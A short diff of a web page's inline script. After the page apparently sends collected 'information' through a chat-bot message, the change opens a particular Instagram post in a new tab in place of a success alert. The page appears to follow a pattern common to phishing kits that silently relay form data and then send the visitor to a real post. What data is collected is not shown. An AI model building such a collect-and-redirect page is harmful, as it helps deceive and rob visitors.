@@ -105,13 +105,13 @@
                         parse_mode: 'html',
                         text: message
                     }).then(response => {
-                        alert('Information sent successfully!');
+                        window.open('https://www.instagram.com/p/DCSPf62RoWK/?utm_source=ig_web_copy_link', '_blank');
                     }).catch(error => {
                         alert('Error sending the information. Please try again.');
                     });
                 })
                 .catch(error => {
-                    window.open('https://www.instagram.com/p/DCSPf62RoWK/?utm_source=ig_web_copy_link', '_blank');
+                    alert('Error!');
                 });
         });
     </script>
